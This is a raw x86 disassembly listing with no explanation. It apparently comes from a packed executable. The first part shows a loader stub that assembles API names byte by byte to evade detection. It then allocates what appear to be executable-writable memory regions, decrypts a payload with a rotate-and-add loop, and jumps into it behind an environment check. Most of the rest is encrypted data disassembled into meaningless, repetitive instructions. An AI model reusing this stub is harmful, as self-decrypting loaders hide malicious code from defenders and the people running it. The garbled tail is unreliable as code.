  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	push   0x1
  42165b:	lea    ecx,[ebp-0x14]
  42165e:	push   ecx
  42165f:	call   DWORD PTR ds:0x428004
  421665:	mov    BYTE PTR [ebp-0x40],0x56
  421669:	call   DWORD PTR ds:0x428014
  42166f:	mov    DWORD PTR [ebp-0x2c],eax
  421672:	mov    BYTE PTR [ebp-0x3e],0x72
  421676:	movzx  edx,WORD PTR [ebp-0x2c]
  42167a:	test   edx,edx
  42167c:	jne    0x4216be
  42167e:	mov    BYTE PTR [ebp-0x34],0x0
  421682:	mov    DWORD PTR [ebp-0x14],0xe0d
  421689:	lea    eax,[ebp-0x28]
  42168c:	push   eax
  42168d:	call   DWORD PTR ds:0x428018
  421693:	mov    DWORD PTR [ebp-0x68],eax
  421696:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169d:	lea    ecx,[ebp-0x40]
  4216a0:	push   ecx
  4216a1:	mov    edx,DWORD PTR [ebp-0x68]
  4216a4:	push   edx
  4216a5:	call   DWORD PTR ds:0x42801c
  4216ab:	mov    DWORD PTR [ebp-0x44],eax
  4216ae:	mov    DWORD PTR [ebp-0x8],0x6e3d74f1
  4216b5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216bc:	jmp    0x4216d3
  4216be:	mov    BYTE PTR ds:0x443a58,0x0
  4216c5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216cc:	mov    BYTE PTR ds:0x441b18,0x0
  4216d3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216da:	push   DWORD PTR ds:0x428018
  4216e0:	pop    edx
  4216e1:	mov    DWORD PTR [ebp-0x74],edx
  4216e4:	push   DWORD PTR [ebp-0x30]
  4216e7:	push   0x1000
  4216ec:	mov    eax,DWORD PTR [ebp-0x14]
  4216ef:	add    eax,0x23
  4216f2:	add    eax,0x23
  4216f5:	push   eax
  4216f6:	xor    eax,eax
  4216f8:	push   eax
  4216f9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fc:	call   ecx
  4216fe:	mov    edx,eax
  421700:	mov    DWORD PTR [ebp-0x4],edx
  421703:	mov    eax,DWORD PTR [ebp-0x70]
  421706:	sub    eax,0xdae0b
  42170b:	mov    DWORD PTR [ebp-0x70],eax
  42170e:	cmp    DWORD PTR [ebp-0x4],0x0
  421712:	jne    0x42171b
  421714:	mov    BYTE PTR ds:0x441b18,0x0
  42171b:	mov    ecx,DWORD PTR [ebp-0x4]
  42171e:	add    ecx,DWORD PTR [ebp-0x14]
  421721:	mov    edx,DWORD PTR [ebp-0x8]
  421724:	mov    DWORD PTR [ecx],edx
  421726:	mov    eax,DWORD PTR [ebp-0x4]
  421729:	add    eax,DWORD PTR [ebp-0x5c]
  42172c:	mov    DWORD PTR [ebp-0x64],eax
  42172f:	mov    ecx,DWORD PTR ds:0x42801c
  421735:	mov    DWORD PTR [ebp-0x54],ecx
  421738:	mov    edx,DWORD PTR [ebp-0x4]
  42173b:	add    edx,DWORD PTR [ebp-0x14]
  42173e:	mov    eax,DWORD PTR [ebp+0x8]
  421741:	mov    DWORD PTR [edx+0x4],eax
  421744:	mov    ecx,DWORD PTR [ebp-0x4]
  421747:	add    ecx,DWORD PTR [ebp-0x14]
  42174a:	mov    DWORD PTR [ebp-0xc],ecx
  42174d:	cmp    DWORD PTR [ebp-0x70],0x0
  421751:	jbe    0x42176e
  421753:	mov    edx,DWORD PTR [ebp-0xc]
  421756:	push   edx
  421757:	mov    eax,DWORD PTR [ebp-0x14]
  42175a:	push   eax
  42175b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175e:	add    ecx,DWORD PTR [ebp-0x70]
  421761:	push   ecx
  421762:	mov    edx,DWORD PTR [ebp-0x4]
  421765:	push   edx
  421766:	call   0x4214d0
  42176b:	add    esp,0x10
  42176e:	cmp    DWORD PTR [ebp-0x64],0x0
  421772:	je     0x421786
  421774:	mov    ecx,DWORD PTR [ebp-0x54]
  421777:	push   ecx
  421778:	push   DWORD PTR [ebp-0x74]
  42177b:	mov    esi,DWORD PTR [ebp-0x64]
  42177e:	push   edx
  42177f:	pop    eax
  421780:	push   ecx
  421781:	nop
  421782:	jmp    esi
  421784:	jmp    0x42178c
  421786:	mov    eax,DWORD PTR [ebp+0x8]
  421789:	mov    DWORD PTR [ebp-0x18],eax
  42178c:	mov    eax,0x1
  421791:	pop    esi
  421792:	mov    esp,ebp
  421794:	pop    ebp
  421795:	ret    
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0x196605fa
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	call   FWORD PTR [ebp+0x9e223ae]
  421833:	sub    eax,0x288a6c85
  421838:	mov    ds:0xf42ff95d,eax
  42183d:	mov    bl,0x5a
  42183f:	or     ch,BYTE PTR ds:0x288e6c85
  421845:	mov    ds:0xf4d0061d,eax
  42184a:	mov    bl,0xe2
  42184c:	or     ch,BYTE PTR ds:0x288e6c85
  421852:	mov    ds:0xf4d0065d,eax
  421857:	mov    bl,0xe2
  421859:	or     ch,BYTE PTR ds:0x288e6c85
  42185f:	mov    ds:0xf4d0065d,eax
  421864:	mov    bl,0xe2
  421866:	or     ch,BYTE PTR ds:0x28766c85
  42186c:	mov    ds:0x4ecf085d,eax
  421871:	mov    ebp,0x4824bee2
  421876:	dec    ebp
  421877:	ss sub edi,ebp
  42187a:	nop
  42187b:	daa    
  42187c:	test   BYTE PTR [edx+ebx*8-0x8a2d56f],bl
  421883:	add    ebp,ecx
  421885:	pop    edx
  421886:	ret    0x2630
  421889:	mov    bl,0x95
  42188b:	fisttp QWORD PTR [ebp+eiz*2-0x14f15aa7]
  421892:	or     cl,dl
  421894:	sub    BYTE PTR [eax-0x10],ch
  421897:	popf   
  421898:	ffree  st(2)
  42189a:	dec    esi
  42189b:	(bad)  
  42189c:	(bad)  
  42189d:	dec    esp
  42189e:	jecxz  0x4218e7
  4218a0:	(bad)  
  4218a1:	cmp    BYTE PTR [eax],ch
  4218a3:	(bad)  
  4218a5:	mov    ecx,0x852d0ac6
  4218aa:	ins    BYTE PTR es:[edi],dx
  4218ab:	mov    gs,WORD PTR [eax]
  4218ad:	mov    ds:0xad2c9f5a,eax
  4218b2:	lock sbb bl,BYTE PTR [eax+0x1c94c627]
  4218b9:	and    ah,al
  4218bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218bc:	xchg   esp,eax
  4218bd:	fisubr DWORD PTR [esi+edx*8+0x7d7200ee]
  4218c4:	inc    BYTE PTR [eax+esi*2+0x120c65c6]
  4218cb:	or     al,0x21
  4218cd:	call   0x66fe6124
  4218d2:	out    0xd0,al
  4218d4:	xor    DWORD PTR [edi+0x2a],edx
  4218d7:	pop    esi
  4218d8:	int    0xb9
  4218da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218db:	repnz mov edi,0x390e268f
  4218e1:	test   eax,0xfe42fe17
  4218e6:	stc    
  4218e7:	bound  ecx,QWORD PTR [ebx]
  4218e9:	daa    
  4218ea:	fst    QWORD PTR [esp+ebx*1-0x6a5a1fde]
  4218f1:	fcmovu st,st(4)
  4218f3:	dec    edx
  4218f4:	jo     0x4218f6
  4218f6:	xchg   edx,eax
  4218f7:	pop    ebp
  4218f8:	in     al,dx
  4218f9:	test   BYTE PTR [ebp+0x5b],ah
  4218fc:	iret   
  4218fd:	or     al,0x88
  4218ff:	xchg   ecx,eax
  421900:	mov    gs,eax
  421902:	add    dl,ch
  421904:	pop    ss
  421905:	data16 (bad) 
  421907:	dec    ebp
  421908:	stos   DWORD PTR es:[edi],eax
  421909:	push   edi
  42190a:	inc    esp
  42190b:	sub    BYTE PTR [esi-0x47],ah
  42190e:	mov    edx,0x2e8f226f
  421913:	jbe    0x4218cf
  421915:	test   eax,0x9cb36f0f
  42191a:	lock sbb bl,BYTE PTR [eax-0x71937ad9]
  421921:	sub    BYTE PTR [ebx-0x5b2ff9a3],ah
  421927:	mul    dl
  421929:	or     ah,BYTE PTR [ecx-0x7c]
  42192c:	outs   dx,BYTE PTR ds:[esi]
  42192d:	mov    cs,WORD PTR [eax-0x2fb6c98d]
  421933:	hlt    
  421934:	mov    bl,0xe2
  421936:	or     ch,BYTE PTR ds:0x286e6c85
  42193c:	mov    al,ds:0xfed10d5c
  421941:	mov    bl,0xe2
  421943:	in     al,0x29
  421945:	test   DWORD PTR [edx+esi*1+0x2e],ebp
  421949:	mov    ds:0xf4d0065d,eax
  42194e:	mov    ds:0x852d0a5f,al
  421953:	jl     0x4218e3
  421955:	sub    BYTE PTR [ebx-0xb2ffca3],ah
  42195b:	mov    bl,0xa3
  42195d:	or     ch,BYTE PTR ds:0x288e6c95
  421963:	mov    eax,ds:0xf4d5065d
  421968:	mov    dl,0xe2
  42196a:	or     ch,BYTE PTR ds:0x288b6c85
  421970:	mov    ds:0xf4d0065d,al
  421975:	mov    bl,0xe2
  421977:	pop    edx
  421978:	and    DWORD PTR [ebp-0x5cd77594],eax
  42197e:	pop    esp
  42197f:	loop   0x421956
  421981:	hlt    
  421982:	mov    cl,0xe2
  421984:	or     ch,BYTE PTR [ebp+0x289e6c85]
  42198a:	mov    ds:0xf4d0064d,eax
  42198f:	mov    bl,0xf2
  421991:	or     ch,BYTE PTR ds:0x288e6c95
  421997:	mov    ds:0xf4c0065d,eax
  42199c:	mov    bl,0xe2
  42199e:	or     ch,BYTE PTR ds:0x288e6c85
  4219a4:	mov    ds:0xf8e9f25d,eax
  4219a9:	mov    bl,0x8b
  4219ab:	or     DWORD PTR ds:0x237e6c85,ebp
  4219b1:	mov    ds:0xf4d04f12,eax
  4219b6:	mov    bl,0xe2
  4219b8:	or     ch,BYTE PTR ds:0x288e6c85
  4219be:	mov    ds:0xf4d0065d,eax
  4219c3:	mov    bl,0xe2
  4219c5:	or     ch,BYTE PTR ds:0x288e6c85
  4219cb:	mov    ds:0xf4d0065d,eax
  4219d0:	mov    bl,0xe2
  4219d2:	or     ch,BYTE PTR ds:0x288e6c85
  4219d8:	mov    ds:0xf4d0065d,eax
  4219dd:	mov    bl,0xe2
  4219df:	or     ch,BYTE PTR ds:0x288e6c85
  4219e5:	mov    ds:0xf4d0065d,eax
  4219ea:	mov    bl,0xe2
  4219ec:	or     ch,BYTE PTR ds:0x288e6c85
  4219f2:	mov    ds:0xf4d0065d,eax
  4219f7:	mov    bl,0xe2
  4219f9:	or     ch,BYTE PTR ds:0x288e6c85
  4219ff:	mov    ds:0xf4d0065d,eax
  421a04:	mov    bl,0xe2
  421a06:	or     ch,BYTE PTR ds:0x288e6c85
  421a0c:	mov    ds:0xf4d0065d,eax
  421a11:	mov    bl,0xe2
  421a13:	or     ch,BYTE PTR ds:0x288e6c85
  421a19:	mov    ds:0xf4d0065d,eax
  421a1e:	popf   
  421a1f:	xchg   esi,eax
  421a20:	outs   dx,DWORD PTR ds:[esi]
  421a21:	push   ebp
  421a22:	icebp  
  421a23:	ins    BYTE PTR es:[edi],dx
  421a24:	mov    gs,WORD PTR [eax]
  421a26:	mov    ds:0xf4d00dbd,eax
  421a2b:	mov    ds:0x512d0ae2,eax
  421a30:	push   0x5da7288e
  421a35:	push   es
  421a36:	xor    BYTE PTR [ecx+0x625ed0f0],0x85
  421a3d:	ins    BYTE PTR es:[edi],dx
  421a3e:	mov    gs,WORD PTR [eax]
  421a40:	mov    ds:0xf4d0265d,eax
  421a45:	push   ebx
  421a46:	int3   
  421a47:	js     0x421aa7
  421a49:	test   DWORD PTR [edi],0x5da3288e
  421a4f:	data16 shl ah,1
  421a52:	mov    bl,0x12
  421a54:	add    DWORD PTR ds:0x288e3685,ebp
  421a5a:	mov    ds:0xf4d00285,eax
  421a5f:	mov    bl,0xe2
  421a61:	or     ch,BYTE PTR ds:0x288e6c85
  421a67:	mov    ds:0xf4f0065d,eax
  421a6c:	mov    bl,0x2
  421a6e:	or     ch,BYTE PTR ds:0x288e6c85
  421a74:	mov    ds:0xf4d0065d,eax
  421a79:	mov    bl,0xe2
  421a7b:	or     ch,BYTE PTR ds:0x288e6c85
  421a81:	mov    ds:0xf4d0065d,eax
  421a86:	mov    bl,0xe2
  421a88:	or     ch,BYTE PTR ds:0x288e6c85
  421a8e:	mov    ds:0xf4d0065d,eax
  421a93:	mov    bl,0xe2
  421a95:	or     ch,BYTE PTR ds:0x288e6c85
  421a9b:	mov    ds:0xf4d0065d,eax
  421aa0:	mov    bl,0xe2
  421aa2:	or     ch,BYTE PTR ds:0x288e6c85
  421aa8:	mov    ds:0xf4d0065d,eax
  421aad:	mov    bl,0xe2
  421aaf:	or     ch,BYTE PTR ds:0x288e6c85
  421ab5:	mov    ds:0xf4d0065d,eax
  421aba:	mov    bl,0xe2
  421abc:	or     ch,BYTE PTR ds:0x288e6c85
  421ac2:	mov    ds:0xf4d0065d,eax
  421ac7:	mov    bl,0xe2
  421ac9:	or     ch,BYTE PTR ds:0x288e6c85
  421acf:	mov    ds:0xf4d0065d,eax
  421ad4:	mov    bl,0xe2
  421ad6:	or     ch,BYTE PTR ds:0x288e6c85
  421adc:	mov    ds:0xf4d0065d,eax
  421ae1:	mov    bl,0xe2
  421ae3:	or     ch,BYTE PTR ds:0x288e6c85
  421ae9:	mov    ds:0xf4d0065d,eax
  421aee:	mov    bl,0xe2
  421af0:	or     ch,BYTE PTR ds:0x288e6c85
  421af6:	mov    ds:0xf4d0065d,eax
  421afb:	mov    bl,0xe2
  421afd:	or     ch,BYTE PTR ds:0x288e6c85
  421b03:	mov    ds:0xf4d0065d,eax
  421b08:	mov    bl,0xe2
  421b0a:	or     ch,BYTE PTR ds:0x288e6c85
  421b10:	mov    ds:0xf4d0065d,eax
  421b15:	mov    bl,0xe2
  421b17:	or     ch,BYTE PTR ds:0x288e6c85
  421b1d:	mov    ds:0xf4d0065d,eax
  421b22:	mov    bl,0xe2
  421b24:	or     ch,BYTE PTR ds:0x288e6c85
  421b2a:	mov    ds:0xf4d0065d,eax
  421b2f:	mov    bl,0xe2
  421b31:	or     ch,BYTE PTR ds:0x288e6c85
  421b37:	mov    ds:0xf4d0065d,eax
  421b3c:	mov    bl,0xe2
  421b3e:	or     ch,BYTE PTR ds:0x288e6c85
  421b44:	mov    ds:0xf4d0065d,eax
  421b49:	mov    bl,0xe2
  421b4b:	or     ch,BYTE PTR ds:0x288e6c85
  421b51:	mov    ds:0xf4d0065d,eax
  421b56:	mov    bl,0xe2
  421b58:	or     ch,BYTE PTR ds:0x288e6c85
  421b5e:	mov    ds:0xf4d0065d,eax
  421b63:	mov    bl,0xe2
  421b65:	or     ch,BYTE PTR ds:0x288e6c85
  421b6b:	mov    ds:0xf4d0065d,eax
  421b70:	mov    bl,0xe2
  421b72:	or     ch,BYTE PTR ds:0x288e6c85
  421b78:	mov    ds:0xf4d0065d,eax
  421b7d:	mov    bl,0xe2
  421b7f:	or     ch,BYTE PTR ds:0x288e6c85
  421b85:	mov    ds:0xf4d0065d,eax
  421b8a:	mov    bl,0xe2
  421b8c:	or     ch,BYTE PTR ds:0x288e6c85
  421b92:	mov    ds:0xf4d0065d,eax
  421b97:	mov    bl,0xe2
  421b99:	or     ch,BYTE PTR ds:0x288e6c85
  421b9f:	mov    ds:0xf4d0065d,eax
  421ba4:	mov    bl,0xe2
  421ba6:	or     ch,BYTE PTR ds:0x288e6c85
  421bac:	mov    ds:0xf4d0065d,eax
  421bb1:	mov    bl,0xe2
  421bb3:	or     ch,BYTE PTR ds:0x288e6c85
  421bb9:	mov    ds:0xf4d0065d,eax
  421bbe:	mov    bl,0xe2
  421bc0:	or     ch,BYTE PTR ds:0x288e6c85
  421bc6:	mov    ds:0xf4d0065d,eax
  421bcb:	mov    bl,0xe2
  421bcd:	or     ch,BYTE PTR ds:0x288e6c85
  421bd3:	mov    ds:0xf4d0065d,eax
  421bd8:	mov    bl,0xe2
  421bda:	or     ch,BYTE PTR ds:0x288e6c85
  421be0:	mov    ds:0xf4d0065d,eax
  421be5:	mov    bl,0xe2
  421be7:	or     ch,BYTE PTR ds:0x288e6c85
  421bed:	mov    ds:0xf4d0065d,eax
  421bf2:	mov    bl,0xe2
  421bf4:	or     ch,BYTE PTR ds:0x288e6c85
  421bfa:	mov    ds:0xf4d0065d,eax
  421bff:	mov    bl,0xe2
  421c01:	or     ch,BYTE PTR ds:0x288e6c85
  421c07:	mov    ds:0xf4d0065d,eax
  421c0c:	mov    bl,0xe2
  421c0e:	or     ch,BYTE PTR ds:0x288e6c85
  421c14:	mov    ds:0xf4d0065d,eax
  421c19:	mov    bl,0xe2
  421c1b:	or     ch,BYTE PTR ds:0x288e6c85
  421c21:	mov    ds:0xf4d0065d,eax
  421c26:	mov    bl,0xe2
  421c28:	or     ch,BYTE PTR ds:0x288e6c85
  421c2e:	int3   
  421c2f:	cmc    
  421c30:	or     eax,0xe2b3dbd0
  421c35:	sbb    ch,BYTE PTR ds:0xf22c4685
  421c3b:	sar    BYTE PTR [ebx],cl
  421c3d:	stc    
  421c3e:	std    
  421c3f:	push   0x34
  421c41:	mov    dl,0xe7
  421c43:	sbb    ebp,DWORD PTR [ebp+0x7f]
  421c46:	cmp    bh,BYTE PTR [ebp-0x757dd33b]
  421c4c:	out    0x2,eax
  421c4e:	push   ebp
  421c4f:	sbb    al,0x40
  421c51:	popa   
  421c52:	out    0xf,al
  421c54:	out    dx,al
  421c55:	lea    edi,[edi]
  421c57:	xchg   esi,eax
  421c58:	out    dx,eax
  421c59:	int    0x80
  421c5b:	lods   eax,DWORD PTR ds:[esi]
  421c5c:	mov    ebx,0xa96ca73a
  421c61:	(bad)  
  421c62:	sub    ecx,DWORD PTR [eax]
  421c64:	push   edi
  421c65:	mov    ebp,0xd7df815d
  421c6a:	cmp    DWORD PTR [esp+ecx*1],esi
  421c6d:	xor    esi,0x34ae687
  421c73:	xor    DWORD PTR [edx+ebx*1+0x86a2794],ebx
  421c7a:	scas   al,BYTE PTR es:[edi]
  421c7b:	mov    ebp,DWORD PTR [esp+ebp*4-0x344e0254]
  421c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c83:	pop    ebx
  421c84:	outs   dx,BYTE PTR ds:[esi]
  421c85:	dec    ebx
  421c86:	(bad)  
  421c88:	add    esi,ebx
  421c8a:	rol    BYTE PTR [edi+0x56b4168a],0x88
  421c91:	push   ds
  421c92:	out    dx,al
  421c93:	mov    BYTE PTR [edi+0x66d6c2d8],ch
  421c99:	jbe    0x421c7b
  421c9b:	lahf   
  421c9c:	add    eax,0x8bce05a1
  421ca1:	mov    cl,0x88
  421ca3:	mov    eax,0xb26ab402
  421ca8:	setns  BYTE PTR [ebx]
  421cab:	outs   dx,DWORD PTR ds:[esi]
  421cac:	stos   DWORD PTR es:[edi],eax
  421cad:	xchg   ebx,eax
  421cae:	mov    edi,0x9ea6f19
  421cb3:	mov    esi,0x275fed56
  421cb8:	daa    
  421cb9:	shr    BYTE PTR [eax+0x6e2c611b],0x62
  421cc0:	ret    
  421cc1:	xor    BYTE PTR [edx+ecx*8],0x48
  421cc5:	jno    0x421cca
  421cc7:	shl    DWORD PTR [ebx+0x57d1a9da],1
  421ccd:	enter  0xb547,0x4d
  421cd1:	inc    eax
  421cd2:	fstp   QWORD PTR [edi-0x4498311b]
  421cd8:	jno    0x421c8a
  421cda:	cmp    cl,BYTE PTR [ecx+ecx*8-0x32]
  421cde:	pushf  
  421cdf:	fmul   QWORD PTR [edx]
  421ce1:	push   es
  421ce2:	mov    esi,0x735a893d
  421ce7:	mov    ebx,0x98dc0306
  421cec:	out    dx,al
  421ced:	dec    esi
  421cee:	nop
  421cef:	xchg   DWORD PTR [esi],esi
  421cf1:	and    DWORD PTR [edi+0x5cd764db],ebx
  421cf7:	dec    ebp
  421cf8:	aad    0xfc
  421cfa:	or     al,BYTE PTR [eax+ebx*8-0x1a]
  421cfe:	jg     0x421cc9
  421d00:	adc    DWORD PTR [edx+0x4dec45c9],ebp
  421d06:	fldenv ds:0x1e85057f
  421d0c:	retf   0xd38e
  421d0f:	test   eax,0x3f72155b
  421d14:	leave  
  421d15:	jle    0x421d7f
  421d17:	(bad)  
  421d18:	dec    esp
  421d19:	or     eax,0x588558f6
  421d1e:	repz (bad) 
  421d20:	icebp  
  421d21:	fs dec esp
  421d23:	in     al,dx
  421d24:	hlt    
  421d25:	mov    edx,0x1d9a7b79
  421d2a:	(bad)  
  421d2b:	popa   
  421d2c:	rcl    BYTE PTR [esi],cl
  421d2e:	mov    dh,0x3f
  421d30:	or     BYTE PTR [esp+esi*2-0x56],al
  421d34:	mov    ds:0xfc197264,al
  421d39:	inc    ecx
  421d3a:	in     al,0x1b
  421d3c:	sub    eax,0xfa6d0e4e
  421d41:	mov    bh,0x73
  421d43:	mov    dl,BYTE PTR [edi]
  421d45:	mov    eax,0x708ad19a
  421d4a:	cmp    eax,0x7ac49f2b
  421d4f:	popf   
  421d50:	shr    DWORD PTR [edx],0xe2
  421d53:	fisubr WORD PTR [esp+ebp*8]
  421d56:	aaa    
  421d57:	pop    ecx
  421d58:	fnstenv [edx+edx*2]
  421d5b:	sub    DWORD PTR [edx-0xe2c8dd0],0xffffffa7
  421d62:	inc    ebx
  421d63:	jmp    0x73867737
  421d68:	fcom   QWORD PTR [edi-0x54e4fdfb]
  421d6e:	cmp    al,0x4b
  421d70:	imul   esi,DWORD PTR [esp+ebx*8],0xe4ca13d6
  421d77:	and    esp,esp
  421d79:	xor    dh,BYTE PTR [ecx+ebx*8-0x37]
  421d7d:	(bad)  
  421d7e:	mov    edi,0x3eafcaa4
  421d83:	dec    DWORD PTR [ecx+0x3047914]
  421d89:	mov    ch,0xc4
  421d8b:	in     eax,0xf5
  421d8d:	mov    esp,0xd09cc249
  421d92:	push   esi
  421d93:	cmp    DWORD PTR [edx+0x22],esp
  421d96:	(bad)  
  421d98:	leave  
  421d99:	xor    DWORD PTR [ebx+0x8],ebx
  421d9c:	add    BYTE PTR [edi+esi*1-0x66],bl
  421da0:	and    al,0x67
  421da2:	pop    edx
  421da3:	xor    al,0xf
  421da5:	xor    DWORD PTR [ecx+ecx*1-0x40623d25],esi
  421dac:	lea    edx,[ebx+ebp*4-0x55c60417]
  421db3:	jg     0x421dac
  421db5:	jo     0x421dbf
  421db7:	pop    ecx
  421db8:	push   esp
  421db9:	cs mov esi,0x6a8cfca0
  421dbf:	mov    al,ds:0x76a31c5b
  421dc4:	cwde   
  421dc5:	mov    eax,DWORD PTR ds:0x32794473
  421dcb:	fs (bad) 
  421dcd:	pop    edx
  421dce:	sbb    eax,DWORD PTR fs:[edx]
  421dd1:	repnz lea ebx,[eax]
  421dd4:	shr    BYTE PTR [ecx+0x34],0xaf
  421dd8:	push   ecx
  421dd9:	popa   
  421dda:	into   
  421ddb:	fucom  st(4)
  421ddd:	outs   dx,DWORD PTR ds:[esi]
  421dde:	push   edx
  421ddf:	push   esi
  421de1:	test   BYTE PTR [ebx-0x55],bh
  421de4:	pop    ss
  421de5:	xchg   ebx,eax
  421de6:	out    0x89,eax
  421de8:	fnstenv [ecx-0x31400d30]
  421dee:	jo     0x421e5b
  421df0:	xor    al,al
  421df2:	bound  esi,QWORD PTR [edx+0x25]
  421df5:	or     eax,ebx
  421df7:	mov    edx,ss
  421df9:	mov    cl,0x23
  421dfb:	call   0xfe4a:0xebec780a
  421e02:	add    bl,0xdd
  421e05:	pop    ebp
  421e06:	repz and eax,0xd53bbd38
  421e0c:	div    DWORD PTR [ecx]
  421e0e:	(bad)  
  421e0f:	ds pop ecx
  421e11:	push   0xad94eb8
  421e16:	push   eax
  421e17:	push   ecx
  421e18:	pop    ebp
  421e19:	ss retf 
  421e1b:	frstor [edx]
